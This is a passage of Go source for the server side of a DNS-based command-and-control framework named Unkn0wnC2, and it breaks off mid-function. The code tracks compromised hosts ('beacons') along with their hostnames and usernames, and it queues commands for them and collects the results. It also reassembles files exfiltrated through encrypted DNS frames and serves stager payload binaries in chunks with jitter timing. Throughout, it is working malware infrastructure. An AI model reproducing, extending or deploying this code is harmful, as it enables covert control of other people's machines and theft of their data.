// Package main implements the C2 management functionality for the Unkn0wnC2 server.
// This file handles beacon registration, task queuing, result collection, and
// the core C2 protocol logic including chunked data transmission.
package main

import (
	"bytes"
	"crypto/sha256"
	"encoding/base64"
	"encoding/hex"
	"fmt"
	"strconv"
	"strings"
	"sync"
	"time"
)

// generateDeterministicSessionID creates a consistent session ID from stagerIP + clientBinaryID
// This ensures all DNS servers generate the same session ID for the same stager
func generateDeterministicSessionID(stagerIP, clientBinaryID string) string {
	data := fmt.Sprintf("%s|%s", stagerIP, clientBinaryID)
	hash := sha256.Sum256([]byte(data))
	hashHex := hex.EncodeToString(hash[:])
	return fmt.Sprintf("stg_%s", hashHex[:4])
}

// Constants are now defined in constants.go

// C2QueryInfo is populated by processBeaconQuery so the caller can determine
// which beacon and protocol phase a DNS response belongs to.
type C2QueryInfo struct {
	BeaconID string
	MsgType  string // CHK, POLL, DATA, RESULT, etc.
}

// BeaconPhaseConfig holds per-phase malleable settings for a beacon (learned from build config)
type BeaconPhaseConfig struct {
	RegQueryType      string `json:"reg_query_type,omitempty"`       // "TXT" or "A"
	RegEncrypted      bool   `json:"reg_encrypted"`
	RegACKIP          string `json:"reg_ack_ip,omitempty"`
	PollQueryType     string `json:"poll_query_type,omitempty"`      // "TXT" or "A"
	PollEncrypted     bool   `json:"poll_encrypted"`
	PollACKIP         string `json:"poll_ack_ip,omitempty"`
	PollTaskIP        string `json:"poll_task_ip,omitempty"`
	TxtFollowUpSecs   int    `json:"txt_follow_up_secs,omitempty"`
	ExfilQueryType    string `json:"exfil_query_type,omitempty"`     // "TXT" or "A"
	ExfilEncrypted    bool   `json:"exfil_encrypted"`
	ExfilACKIP        string `json:"exfil_ack_ip,omitempty"`
}

// Beacon represents a connected beacon client
type Beacon struct {
	ID                string             `json:"id"`
	Hostname          string             `json:"hostname"`
	Username          string             `json:"username"`
	OS                string             `json:"os"`
	Arch              string             `json:"arch"`
	FirstSeen         time.Time          `json:"first_seen"`
	LastSeen          time.Time          `json:"last_seen"`
	IPAddress         string             `json:"ip_address"`
	BeaconName        string             `json:"beacon_name,omitempty"`
	BuildID           string             `json:"build_id,omitempty"`
	PayloadFormat     string             `json:"payload_format,omitempty"`
	Encoding          string             `json:"encoding,omitempty"` // "aes-gcm-base36" (default) or "base36"
	RegistrationStage *int               `json:"registration_stage,omitempty"`
	PhaseConfig       *BeaconPhaseConfig `json:"-"`
	TaskQueue         []Task             `json:"-"`
	CurrentTask       string             `json:"-"`
}

func (b *Beacon) buildConfigKey() string {
	if b.BuildID != "" {
		return b.BuildID
	}
	return b.BeaconName
}

// Task represents a command task for a beacon
type Task struct {
	ID        string     `json:"id"`
	BeaconID  string     `json:"beacon_id"`
	Command   string     `json:"command"`
	Status    string     `json:"status"` // "pending", "sent", "completed", "failed"
	CreatedAt time.Time  `json:"created_at"`
	SentAt    *time.Time `json:"sent_at,omitempty"`
	Result    string     `json:"result,omitempty"`
}

// ResultChunk represents a piece of a multi-part result
type ResultChunk struct {
	BeaconID    string
	TaskID      string
	ChunkIndex  int
	TotalChunks int
	Data        string
	ReceivedAt  time.Time
}

// ExpectedResult tracks metadata for incoming chunked results
type ExpectedResult struct {
	BeaconID       string
	TaskID         string
	TotalSize      int
	TotalChunks    int
	ReceivedAt     time.Time
	ReceivedData   []string        // Store chunks in order
	LastChunkIndex int             // Track last chunk received for progress calculation
	ReceivedChunks map[int]bool    // Track which chunk indices we've received (deduplication)
}

// ChunkedTaskState tracks a multi-chunk task being delivered to a beacon
type ChunkedTaskState struct {
	TaskID      string
	Command     string
	TotalChunks int
	DeliveredAt time.Time
}

// ExfilSession tracks per-session metadata for dedicated exfil client uploads
type ExfilSession struct {
	SessionID      string
	JobID          string
	FileName       string
	FileSize       uint64
	TotalChunks    uint32
	ReceivedCount  int
	ReceivedChunks map[uint32]bool
	PendingChunks  map[uint32][]byte
	Status         string
	ClientIP       string
	Note           string
	CreatedAt      time.Time
	LastActivity   time.Time
	LastChunkAt    time.Time
}

// ExfilTagTracker keeps state for label-encoded exfil frames that reference session tags.
type ExfilTagTracker struct {
	Tag          string
	SessionID    uint32
	JobID        uint32
	TotalFrames  uint32
	TotalChunks  uint32
	CreatedAt    time.Time
	LastActivity time.Time
}

type metadataAssembler struct {
	segments   map[uint32][]byte
	finalIndex *uint32
}

type pendingLabelChunk struct {
	payload  string
	counter  uint32
	flags    uint8
	clientIP string
}

// StagerSession tracks a stager deployment session
type StagerSession struct {
	ClientIP           string
	ClientBinaryID     string // Binary ID from Master
	SessionID          string // Session ID for tracking
	OS                 string
	Arch               string
	Chunks             []string // Base64-encoded chunks
	TotalChunks        int
	DeliveredCount     int // Number of chunks delivered
	LastChunkDelivered int // Last chunk index delivered
	CreatedAt          time.Time
	LastActivity       time.Time // Updated on each chunk request to prevent premature expiration
	StartedAt          time.Time // When first chunk was requested
	LastChunk          *int      // Last chunk index sent (pointer to differentiate nil from 0)
	ProgressRunning    bool      // Track if progress updater is running
	ProgressDone       chan bool // Signal to stop progress updater
	ProgressCompleted  bool      // Track if completion message was printed (avoid spam)
}

// C2Manager handles beacon management and tasking
type C2Manager struct {
	beacons              map[string]*Beacon
	tasks                map[string]*Task
	masterTaskIDs        map[string]string               // key: local taskID, value: master taskID
	resultChunks         map[string][]ResultChunk        // key: taskID (legacy)
	expectedResults      map[string]*ExpectedResult      // key: taskID (new two-phase)
	exfilSessions        map[string]*ExfilSession        // key: session hex string
	exfilTagIndex        map[string]*ExfilTagTracker     // key: normalized session tag
	stagerSessions       map[string]*StagerSession       // key: clientIP
	cachedStagerSessions map[string]*CachedStagerSession // key: sessionID (for cache-based sessions)
	completedStagerLogs  map[string]bool                 // key: sessionID, value: true if completion logged (prevents spam)
	recentMessages       map[string]time.Time            // key: message hash, value: timestamp (deduplication)
	knownDomains         []string                        // Active DNS domains from Master (for first check-in)
	db                   *Database                       // Database for persistent storage
	submittedData        map[string]bool                 // key: taskID, value: true if we submitted any data to Master
	metadataAssemblers   map[string]*metadataAssembler   // key: normalized session tag, value: pending metadata buffers
	pendingLabelChunks   map[string][]pendingLabelChunk  // key: normalized session tag, value: buffered data frames awaiting metadata
	tasksInProgress      map[string]time.Time            // key: taskID, value: first chunk received time (prevents re-delivery)
	mutex                sync.RWMutex                    // main mutex for beacons, tasks, recentMessages, tasksInProgress
	exfilMutex           sync.RWMutex                    // separate mutex for exfil operations (exfilSessions, exfilTagIndex, metadataAssemblers, pendingLabelChunks)
	stagerMutex          sync.RWMutex                    // separate mutex for stager operations (stagerSessions, cachedStagerSessions, completedStagerLogs)
	taskCounter          int // Counter for local tasks (standalone mode)
	domainTaskCounter    int // Counter for domain update tasks (D prefix to avoid conflicts)
	debug                bool
	aesKey               []byte
	jitterConfig         StagerJitter // Stager timing configuration
	domain               string           // The domain this server is authoritative for
	buildFormats         map[string]bool                // payload formats pushed from Archon build configs
	buildPhaseConfigs    map[string]*BeaconPhaseConfig  // per-build phase configs pushed from Archon (key: build ID)
	chunkedTasks         map[string]*ChunkedTaskState   // key: "beaconID:taskID", tracks multi-chunk delivery
}

// CachedStagerSession tracks stager sessions created from cached data (no Master roundtrip)
type CachedStagerSession struct {
	SessionID       string
	MasterSessionID string // Session ID assigned by Master for UI tracking
	ClientBinaryID  string
	StagerIP        string
	TotalChunks     int
	ChunksServed    int
	SHA256Checksum  string // Checksum of original binary for verification
	CreatedAt       time.Time
	LastActivity    time.Time
}

// NewC2Manager creates a new C2 management instance with the specified configuration.
// It initializes the beacon tracking system, task management, sets up AES encryption,
// and initializes the database for persistent storage.
func NewC2Manager(debug bool, encryptionKey string, jitterConfig StagerJitter, dbPath string, domain string) *C2Manager {
	aesKey := generateAESKey(encryptionKey)

	// Initialize database
	db, err := NewDatabase(dbPath)
	if err != nil {
		logf("[DB] WARNING: Failed to initialize database: %v", err)
		logf("[DB] Running in memory-only mode (data will not persist)")
		db = nil
	}

	c2 := &C2Manager{
		beacons:              make(map[string]*Beacon),
		submittedData:        make(map[string]bool),
		tasks:                make(map[string]*Task),
		masterTaskIDs:        make(map[string]string),
		resultChunks:         make(map[string][]ResultChunk),
		expectedResults:      make(map[string]*ExpectedResult),
		exfilSessions:        make(map[string]*ExfilSession),
		exfilTagIndex:        make(map[string]*ExfilTagTracker),
		metadataAssemblers:   make(map[string]*metadataAssembler),
		pendingLabelChunks:   make(map[string][]pendingLabelChunk),
		stagerSessions:       make(map[string]*StagerSession),
		cachedStagerSessions: make(map[string]*CachedStagerSession),
		completedStagerLogs:  make(map[string]bool),
		recentMessages:       make(map[string]time.Time),
		tasksInProgress:      make(map[string]time.Time),
		db:                   db,
		taskCounter:          TaskCounterStart,
		domainTaskCounter:    DomainTaskCounterStart,
		debug:                debug,
		aesKey:               aesKey,
		jitterConfig:         jitterConfig,
		domain:               strings.ToLower(domain),
		buildFormats:         make(map[string]bool),
		buildPhaseConfigs:    make(map[string]*BeaconPhaseConfig),
		chunkedTasks:         make(map[string]*ChunkedTaskState),
	}

	// Load existing beacons from database
	if c2.db != nil {
		if err := c2.loadBeaconsFromDB(); err != nil {
			logf("[DB] WARNING: Failed to load beacons from database: %v", err)
		}
		// Load existing tasks from database
		if err := c2.loadTasksFromDB(); err != nil {
			logf("[DB] WARNING: Failed to load tasks from database: %v", err)
		}
	}

	// Start cleanup goroutine
	go c2.cleanupExpiredSessions()

	// Start pending exfil chunk retry goroutine
	go c2.retryPendingExfilChunks()

	// Start periodic database sync
	if c2.db != nil {
		go c2.periodicDBCleanup()
	}

	return c2
}

// loadBeaconsFromDB loads existing beacons from the database into memory
func (c2 *C2Manager) loadBeaconsFromDB() error {
	beacons, err := c2.db.GetAllBeacons()
	if err != nil {
		return fmt.Errorf("failed to load beacons: %w", err)
	}

	c2.mutex.Lock()
	defer c2.mutex.Unlock()

	for _, beacon := range beacons {
		c2.beacons[beacon.ID] = beacon
		logf("[DB] Loaded beacon from database: %s (%s@%s)", beacon.ID, beacon.Username, beacon.Hostname)
	}

	if len(beacons) > 0 {
		logf("[DB] Loaded %d beacon(s) from database", len(beacons))
	}

	return nil
}

// loadTasksFromDB loads existing tasks from the database into memory
func (c2 *C2Manager) loadTasksFromDB() error {
	tasks, err := c2.db.GetAllTasks()
	if err != nil {
		return fmt.Errorf("failed to load tasks: %w", err)
	}

	c2.mutex.Lock()
	defer c2.mutex.Unlock()

	// Load tasks and populate beacon task queues
	for _, task := range tasks {
		c2.tasks[task.ID] = task

		// Update task counter to avoid ID collisions
		if strings.HasPrefix(task.ID, "T") {
			if id, err := strconv.Atoi(task.ID[1:]); err == nil && id >= c2.taskCounter {
				c2.taskCounter = id + 1
			}
			// SHADOW MESH FIX: Populate masterTaskIDs for loaded master tasks
			// Since we now use master task IDs directly, task.ID IS the master ID
			c2.masterTaskIDs[task.ID] = task.ID
		} else if strings.HasPrefix(task.ID, "D") {
			if id, err := strconv.Atoi(task.ID[1:]); err == nil && id >= c2.domainTaskCounter {
				c2.domainTaskCounter = id + 1
			}
			// Note: D-prefix tasks are domain updates (local only, not forwarded to Master)
		}

		// Add pending tasks to beacon queues
		if task.Status == "pending" {
			if beacon, exists := c2.beacons[task.BeaconID]; exists {
				beacon.TaskQueue = append(beacon.TaskQueue, *task)
			}
		} else if task.Status == "sent" {
			// Restore "sent" tasks as current task (beacon may have crashed before completing)
			if beacon, exists := c2.beacons[task.BeaconID]; exists {
				beacon.CurrentTask = task.ID
			}
		}
	}

	if len(tasks) > 0 {
		logf("[DB] Loaded %d task(s) from database", len(tasks))
	}

	return nil
}

// periodicDBCleanup performs periodic database maintenance
func (c2 *C2Manager) periodicDBCleanup() {
	ticker := time.NewTicker(1 * time.Hour)
	defer ticker.Stop()

	for range ticker.C {
		if c2.db == nil {
			return
		}

		// Clean up old completed tasks (older than 30 days by default)
		if err := c2.db.CleanupOldData(30); err != nil {
			if c2.debug {
				logf("[DB] Database cleanup error: %v", err)
			}
		}

		// Log database stats in debug mode
		if c2.debug {
			if stats, err := c2.db.GetDatabaseStats(); err == nil {
				logf("[DB] DB Stats: %d beacons, %d active, %d tasks",
					stats["beacons"], stats["active_beacons"], stats["tasks"])
			}
		}
	}
}

// calculateStagerETA calculates ETA using overall transfer rate (including pauses)
// Returns a human-readable duration string (e.g., "2m 30s", "45s", "2d 5h")
func calculateStagerETA(session *StagerSession, currentChunk int) string {
	if currentChunk >= session.TotalChunks {
		return "complete"
	}

	// Need at least one chunk to calculate
	if currentChunk < 1 || session.StartedAt.IsZero() {
		return "calculating..."
	}

	chunksRemaining := session.TotalChunks - currentChunk

	// ALWAYS use overall average rate including ALL elapsed time (pauses + transfers)
	// This is the only way to get accurate ETA for operations with jitter pauses
	elapsed := time.Since(session.StartedAt).Seconds()
	overallRate := elapsed / float64(currentChunk) // seconds per chunk (includes everything)

	// Estimate remaining time: seconds_per_chunk * chunks_remaining
	estimatedSecondsRemaining := overallRate * float64(chunksRemaining)

	duration := time.Duration(estimatedSecondsRemaining) * time.Second

	// Format as human-readable string with support for days
	if duration < time.Minute {
		return fmt.Sprintf("%ds", int(duration.Seconds()))
	} else if duration < time.Hour {
		minutes := int(duration.Minutes())
		seconds := int(duration.Seconds()) % 60
		if seconds > 0 {
			return fmt.Sprintf("%dm %ds", minutes, seconds)
		}
		return fmt.Sprintf("%dm", minutes)
	} else if duration < 24*time.Hour {
		hours := int(duration.Hours())
		minutes := int(duration.Minutes()) % 60
		if minutes > 0 {
			return fmt.Sprintf("%dh %dm", hours, minutes)
		}
		return fmt.Sprintf("%dh", hours)
	} else {
		// Days and hours for long transfers
		days := int(duration.Hours()) / 24
		hours := int(duration.Hours()) % 24
		if hours > 0 {
			return fmt.Sprintf("%dd %dh", days, hours)
		}
		return fmt.Sprintf("%dd", days)
	}
}

// renderProgressBar creates a visual progress bar for stager downloads
// Returns a formatted string with progress bar, percentage, and ETA
//
//nolint:unused // Used by logStagerProgress
func renderProgressBar(current, total int, eta string, clientIP string) string {
	if total == 0 {
		return ""
	}

	percentage := float64(current) / float64(total) * 100
	barWidth := 40
	filled := int(float64(barWidth) * float64(current) / float64(total))

	// Build progress bar
	bar := "["
	for i := 0; i < barWidth; i++ {
		if i < filled {
			bar += "="
		} else if i == filled && filled < barWidth {
			bar += ">"
		} else {
			bar += " "
		}
	}
	bar += "]"

	// Format: [=========>           ] 25% (10/40 chunks) ETA: 2m 30s - 192.168.1.100
	return fmt.Sprintf("\r[Stager] %s %.1f%% (%d/%d chunks) ETA: %s - %s",
		bar, percentage, current, total, eta, clientIP)
}

// startProgressUpdater starts a goroutine that continuously updates the progress bar
// Caller must NOT hold c2.mutex when calling this function.
func (c2 *C2Manager) startProgressUpdater(session *StagerSession, clientIP string) {
	c2.stagerMutex.Lock()
	if session.ProgressRunning {
		c2.stagerMutex.Unlock()
		return // Already running
	}

	session.ProgressRunning = true
	session.ProgressDone = make(chan bool)
	c2.stagerMutex.Unlock()

	go func() {
		ticker := time.NewTicker(1 * time.Second)
		defer ticker.Stop()

		for {
			select {
			case <-session.ProgressDone:
				return
			case <-ticker.C:
				c2.stagerMutex.RLock()
				if session.LastChunk == nil {
					c2.stagerMutex.RUnlock()
					continue
				}
				current := *session.LastChunk + 1
				if current >= session.TotalChunks {
					c2.stagerMutex.RUnlock()
					return
				}

				eta := calculateStagerETA(session, current)
				progressBar := renderProgressBar(current, session.TotalChunks, eta, clientIP)
				fmt.Print(progressBar)
				c2.stagerMutex.RUnlock()
			}
		}
	}()
}

// stopProgressUpdater stops the progress updater goroutine
// Caller must hold c2.mutex when calling this function.
func (c2 *C2Manager) stopProgressUpdater(session *StagerSession) {
	if session.ProgressRunning && session.ProgressDone != nil {
		close(session.ProgressDone)
		session.ProgressRunning = false
	}
}

// logStagerProgress displays or updates the progress bar for stager downloads
func (c2 *C2Manager) logStagerProgress(session *StagerSession, chunkIndex int, clientIP string) {
	// Skip if completion message was already printed for this session ID
	c2.stagerMutex.RLock()
	if c2.completedStagerLogs[session.SessionID] || session.ProgressCompleted {
		c2.stagerMutex.RUnlock()
		return
	}
	c2.stagerMutex.RUnlock()

	current := chunkIndex + 1
	eta := calculateStagerETA(session, current)

	progressBar := renderProgressBar(current, session.TotalChunks, eta, clientIP)

	// If this is the first chunk, print on new line and start progress updater
	if chunkIndex == 0 {
		fmt.Print("\n" + progressBar)
		c2.startProgressUpdater(session, clientIP)
	} else if current >= session.TotalChunks {
		// Final chunk - stop updater and print completion
		c2.stagerMutex.Lock()
		c2.stopProgressUpdater(session)
		session.ProgressCompleted = true
		c2.completedStagerLogs[session.SessionID] = true // Mark session ID as complete globally
		c2.stagerMutex.Unlock()
		elapsed := time.Since(session.StartedAt)
		fmt.Printf("\r[Stager] %s %.1f%% (%d/%d chunks) Complete in %s - %s\n",
			"[========================================]", 100.0, session.TotalChunks, session.TotalChunks,
			formatDuration(elapsed), clientIP)
	} else {
		// Chunk received - the updater will continue showing progress
		fmt.Print(progressBar)
	}
}

// formatDuration formats a duration into human-readable format
//
//nolint:unused // Used by logStagerProgress
func formatDuration(d time.Duration) string {
	if d < time.Minute {
		return fmt.Sprintf("%ds", int(d.Seconds()))
	} else if d < time.Hour {
		minutes := int(d.Minutes())
		seconds := int(d.Seconds()) % 60
		if seconds > 0 {
			return fmt.Sprintf("%dm %ds", minutes, seconds)
		}
		return fmt.Sprintf("%dm", minutes)
	} else {
		hours := int(d.Hours())
		minutes := int(d.Minutes()) % 60
		return fmt.Sprintf("%dh %dm", hours, minutes)
	}
}

// cleanupExpiredSessions periodically removes expired stager sessions and expected results
func (c2 *C2Manager) cleanupExpiredSessions() {
	ticker := time.NewTicker(CleanupInterval)
	defer ticker.Stop()

	for range ticker.C {
		now := time.Now()

		// Clean up old message hashes (keep only last 5 minutes)
		c2.mutex.Lock()
		expiredCount := 0
		for msgHash, timestamp := range c2.recentMessages {
			if now.Sub(timestamp) > 5*time.Minute {
				delete(c2.recentMessages, msgHash)
				expiredCount++
			}
		}
		// Bounds check: trim recentMessages if still too large after time-based cleanup
		if len(c2.recentMessages) > MaxRecentMessages {
			count := 0
			target := len(c2.recentMessages) / 2
			for k := range c2.recentMessages {
				if count >= target {
					break
				}
				delete(c2.recentMessages, k)
				count++
			}
		}
		chunkedExpired := 0
		for key, state := range c2.chunkedTasks {
			if now.Sub(state.DeliveredAt) > ChunkedTaskStateTTL {
				delete(c2.chunkedTasks, key)
				chunkedExpired++
			}
		}
		c2.mutex.Unlock()
		if c2.debug && expiredCount > 0 {
			logf("[C2] Cleaned up %d expired message hashes", expiredCount)
		}
		if c2.debug && chunkedExpired > 0 {
			logf("[C2] Cleaned up %d expired chunked task states", chunkedExpired)
		}

		// Clean up expired stager sessions (collect IPs first to avoid iteration issues)
		c2.stagerMutex.Lock()
		var expiredSessionIPs []string
		for ip, session := range c2.stagerSessions {
			if now.Sub(session.LastActivity) > StagerSessionTimeout {
				expiredSessionIPs = append(expiredSessionIPs, ip)
			}
		}
		c2.stagerMutex.Unlock()

		// Now safely stop progress updaters and delete sessions (outside lock)
		for _, ip := range expiredSessionIPs {
			c2.stagerMutex.Lock()
			if session, exists := c2.stagerSessions[ip]; exists {
				c2.stopProgressUpdater(session)
				// Also clean up completedStagerLogs entry for this session
				delete(c2.completedStagerLogs, session.SessionID)
				delete(c2.stagerSessions, ip)
				if c2.debug {
					logf("[C2] Cleaned up expired stager session for %s (inactive for %v)", ip, now.Sub(session.LastActivity))
				}
			}
			c2.stagerMutex.Unlock()
		}

		// Bounds check: reset completedStagerLogs if too large
		c2.stagerMutex.Lock()
		if len(c2.completedStagerLogs) > MaxCompletedStagerLogs {
			c2.completedStagerLogs = make(map[string]bool)
		}
		c2.stagerMutex.Unlock()

		// Clean up exfil sessions that have gone quiet
		type expiredExfil struct {
			id   string
			idle time.Duration
		}
		c2.exfilMutex.Lock()
		var expiredExfilSessions []expiredExfil
		for sessionID, session := range c2.exfilSessions {
			if idle := now.Sub(session.LastActivity); idle > ExfilSessionTimeout {
				expiredExfilSessions = append(expiredExfilSessions, expiredExfil{id: sessionID, idle: idle})
				delete(c2.exfilSessions, sessionID)
			}
		}
		for tag, tracker := range c2.exfilTagIndex {
			if now.Sub(tracker.LastActivity) > ExfilSessionTimeout {
				delete(c2.exfilTagIndex, tag)
				// Also clean up any pending chunks for this tag (memory leak fix)
				delete(c2.pendingLabelChunks, normalizeExfilTag(tag))
			}
		}
		c2.exfilMutex.Unlock()
		for _, expired := range expiredExfilSessions {
			if c2.debug {
				logf("[Exfil] Cleaned up inactive session %s (idle %v)", expired.id, expired.idle)
			}
			if c2.db != nil {
				go func(id string) {
					if err := c2.db.UpdateExfilSessionStatus(id, "timeout"); err != nil && c2.debug {
						logf("[Exfil] Failed to mark session %s timed out: %v", id, err)
					}
				}(expired.id)
			}
		}

		// Clean up expired expected results, but save partial results first
		// Collect expired results first (with lock)
		type expiredResult struct {
			taskID      string
			beaconID    string
			data        []string
			recvCount   int
			totalChunks int
		}
		var expiredResults []expiredResult

		c2.mutex.Lock()
		for taskID, expected := range c2.expectedResults {
			if now.Sub(expected.ReceivedAt) > ExpectedResultTimeout {
				// Count received chunks
				receivedCount := 0
				for i := 0; i < expected.TotalChunks && i < len(expected.ReceivedData); i++ {
					if expected.ReceivedData[i] != "" {
						receivedCount++
					}
				}

				// Collect data for processing outside lock
				if receivedCount > 0 {
					expiredResults = append(expiredResults, expiredResult{
						taskID:      taskID,
						beaconID:    expected.BeaconID,
						data:        expected.ReceivedData,
						recvCount:   receivedCount,
						totalChunks: expected.TotalChunks,
					})
				}

				delete(c2.expectedResults, taskID)
			}
		}

		// Clean up recent message hashes older than RecentMessageTTL
		for msgHash, timestamp := range c2.recentMessages {
			if now.Sub(timestamp) > RecentMessageTTL {
				delete(c2.recentMessages, msgHash)
			}
		}

		// Clean up old in-progress task entries (tasks that never completed)
		// Keep entries for 30 minutes to handle long-running commands
		inProgressCleanupCount := 0
		for taskID, startTime := range c2.tasksInProgress {
			if now.Sub(startTime) > 30*time.Minute {
				delete(c2.tasksInProgress, taskID)
				inProgressCleanupCount++
			}
		}

		// Bounds check: evict oldest tasksInProgress if still too large
		if len(c2.tasksInProgress) > MaxTasksInProgress {
			oldest := time.Now()
			var oldestKey string
			for k, v := range c2.tasksInProgress {
				if v.Before(oldest) {
					oldest = v
					oldestKey = k
				}
			}
			if oldestKey != "" {
				delete(c2.tasksInProgress, oldestKey)
			}
		}

		// Clean up masterTaskIDs for completed/failed tasks (memory leak fix)
		// Only clean up tasks that are completed/failed AND older than 1 hour
		masterTaskCleanupCount := 0
		for taskID := range c2.masterTaskIDs {
			if task, exists := c2.tasks[taskID]; exists {
				if (task.Status == "completed" || task.Status == "failed" || task.Status == "partial") &&
					now.Sub(task.CreatedAt) > 1*time.Hour {
					delete(c2.masterTaskIDs, taskID)
					masterTaskCleanupCount++
				}
			} else {
				// Task doesn't exist anymore, clean up the mapping
				delete(c2.masterTaskIDs, taskID)
				masterTaskCleanupCount++
			}
		}

		// Bounds check: trim masterTaskIDs if still too large after time-based cleanup
		if len(c2.masterTaskIDs) > MaxMasterTaskIDs {
			count := 0
			target := len(c2.masterTaskIDs) / 2
			for k := range c2.masterTaskIDs {
				if count >= target {
					break
				}
				delete(c2.masterTaskIDs, k)
				count++
			}
		}
		c2.mutex.Unlock()

		if c2.debug && inProgressCleanupCount > 0 {
			logf("[C2] Cleaned up %d stale in-progress task entries", inProgressCleanupCount)
		}

		// Process expired results outside the lock
		for _, expired := range expiredResults {
			partialResult := strings.Join(expired.data, "")
			logf("[C2] Task %s timed out with %d/%d chunks - saving partial result (%d bytes)",
				expired.taskID, expired.recvCount, expired.totalChunks, len(partialResult))

			// Update task status and save partial result
			c2.mutex.Lock()
			if task, exists := c2.tasks[expired.taskID]; exists {
				task.Result = partialResult
				task.Status = "partial"
			}
			c2.mutex.Unlock()

			// Save to database asynchronously (outside lock)
			if c2.db != nil {
				go func(tid, bid, res string) {
					if err := c2.db.SaveTaskResult(tid, bid, res, 0, 1); err != nil && c2.debug {
						logf("[C2] Failed to save partial result: %v", err)
					}
					// Mark as partial in database
					if err := c2.db.UpdateTaskStatus(tid, "partial"); err != nil && c2.debug {
						logf("[C2] Failed to update task status: %v", err)
					}
				}(expired.taskID, expired.beaconID, partialResult)
			}
		}
	}
}

// GetEncryptionKey returns the AES encryption key for external use
func (c2 *C2Manager) GetEncryptionKey() []byte {
	return c2.aesKey
}

// isPrintableASCII checks if a string contains only printable ASCII characters
// Used to validate that decrypted data is likely valid C2 traffic
func isPrintableASCII(s string) bool {
	for _, r := range s {
		// Allow printable ASCII (space to ~) plus newlines/tabs
		if r < 32 && r != 9 && r != 10 && r != 13 || r > 126 {
			return false
		}
	}
	return true
}

// decodeBeaconData decodes and decrypts beacon data using AES-GCM + base36
func (c2 *C2Manager) decodeBeaconData(encoded string) (string, error) {
	// Remove dots from DNS labels (e.g., "abc.def" -> "abcdef")
	// This handles long subdomains that get split into multiple labels
	encoded = strings.ReplaceAll(encoded, ".", "")

	// Use new base36 + AES-GCM decoding
	decoded, err := decodeAndDecrypt(encoded, c2.aesKey)
	if err != nil {
		return "", fmt.Errorf("failed to decode and decrypt: %v", err)
	}

	return decoded, nil
}

// ProcessExfilFrame consumes a label-encoded exfil frame emitted by the dedicated client.
func (c2 *C2Manager) ProcessExfilFrame(frame *ExfilFrame, clientIP string) (bool, error) {
	if frame == nil {
		return false, fmt.Errorf("nil exfil frame")
	}

	switch frame.Phase {
	case ExfilFrameInit:
		c2.recordExfilInit(frame.SessionTag, frame.Counter)
		return true, nil
	case ExfilFrameChunk:
		if frame.Payload == "" {
			return false, fmt.Errorf("chunk frame missing payload")
		}
		if frame.Flags&FrameEnvelopeFlagMetadata != 0 {
			return c2.handleExfilMetadataFrame(frame, clientIP)
		}
		if frame.Counter == 0 && c2.debug {
			logf("[Exfil] chunk counter 0 without metadata flag")
		}
		return c2.handleExfilDataFrame(frame, clientIP)
	case ExfilFrameComplete:
		return c2.handleExfilCompletionFrame(frame.SessionTag)
	default:
		return false, fmt.Errorf("unknown exfil frame phase: %v", frame.Phase)
	}
}

func (c2 *C2Manager) recordExfilInit(tag string, totalFrames uint32) {
	now := time.Now()
	c2.exfilMutex.Lock()
	tracker := c2.ensureExfilTagTrackerLocked(tag, now)
	tracker.TotalFrames = totalFrames
	// NOTE: Do NOT attempt to calculate TotalChunks from TotalFrames here.
	// TotalFrames includes metadata frames (which can be >1), so the calculation
	// would be inaccurate. TotalChunks should only be set from the metadata payload
	// in handleExfilMetadataFrame, which parses the actual value from the client.
	c2.exfilMutex.Unlock()
}

func (c2 *C2Manager) handleExfilMetadataFrame(frame *ExfilFrame, clientIP string) (bool, error) {
	segment, err := decodeAndDecryptBytes(frame.Payload, c2.aesKey)
	if err != nil {
		// Fallback: try plain base36 decode (unencrypted exfil client)
		if plain, b36Err := base36Decode(strings.ToLower(frame.Payload)); b36Err == nil && len(plain) > 0 {
			segment = plain
		} else {
			return false, fmt.Errorf("exfil metadata decrypt failed: %w", err)
		}
	}

	isFinal := (frame.Flags & FrameEnvelopeFlagFinal) != 0
	assembled, complete := c2.appendMetadataSegment(frame.SessionTag, frame.Counter, segment, isFinal)
	if !complete {
		return true, nil
	}

	meta, err := parseExfilMetadataPayload(assembled)
	if err != nil {
		return false, fmt.Errorf("exfil metadata parse failed: %w", err)
	}
	meta.PayloadLen = uint16(len(assembled))

	now := time.Now()
	c2.exfilMutex.Lock()
	tracker := c2.ensureExfilTagTrackerLocked(frame.SessionTag, now)
	tracker.SessionID = meta.SessionID
	tracker.JobID = meta.JobID
	if meta.TotalChunks != 0 {
		tracker.TotalChunks = meta.TotalChunks
		// NOTE: Do NOT recalculate TotalFrames here. The init frame provides the
		// accurate TotalFrames count (which includes metadata frames). Calculating
		// TotalFrames = TotalChunks + 1 would be wrong for multi-segment metadata.
	}
	c2.exfilMutex.Unlock()

	// Register tag with Master for distributed exfil
	if masterClient != nil {
		sessionIDStr := fmt.Sprintf("%08x", meta.SessionID)
		go func(tag, sid string) {
			if err := masterClient.RegisterExfilTag(tag, sid); err != nil && c2.debug {
				logf("[Exfil] Failed to register tag %s with Master: %v", tag, err)
			}
		}(frame.SessionTag, sessionIDStr)
	}

	ack, err := c2.handleExfilChunk(frame.Payload, meta, clientIP, assembled)
	if err == nil {
		c2.flushPendingLabelChunks(frame.SessionTag)
	}
	return ack, err
}

func (c2 *C2Manager) handleExfilDataFrame(frame *ExfilFrame, clientIP string) (bool, error) {
	tracker, ok := c2.getExfilTagTracker(frame.SessionTag)
	if !ok || tracker.SessionID == 0 {
		// Try to submit by tag if we don't know the session (distributed mode)
		if masterClient != nil {
			// Decrypt payload first (Master expects Base64-encoded plaintext)
			// Try AES-GCM first, fall back to plain base36 for unencrypted exfil clients
			plaintext, decryptErr := decodeAndDecryptBytes(frame.Payload, c2.aesKey)
			if decryptErr != nil {
				if plain, b36Err := base36Decode(strings.ToLower(frame.Payload)); b36Err == nil && len(plain) > 0 {
					plaintext = plain
					decryptErr = nil
				}
			}
			if decryptErr == nil {
				payloadB64 := base64.StdEncoding.EncodeToString(plaintext)

				// Try to forward to Master - if tag isn't registered yet, buffer for retry
				completed, err := masterClient.SubmitExfilChunkByTag(frame.SessionTag, int(frame.Counter), payloadB64)
				if err == nil {
					if c2.debug {
						logf("[Exfil] Forwarded orphan chunk tag=%s idx=%d to Master", frame.SessionTag, frame.Counter)
					}
					if completed && c2.debug {
						logf("[Exfil] Master signaled session for tag %s is complete", frame.SessionTag)
					}
					return true, nil
				}

				// If Master rejected (tag not found), buffer the chunk for retry
				// Don't create local sessions with tag_ prefix - this causes duplicate UI entries
				if c2.debug {
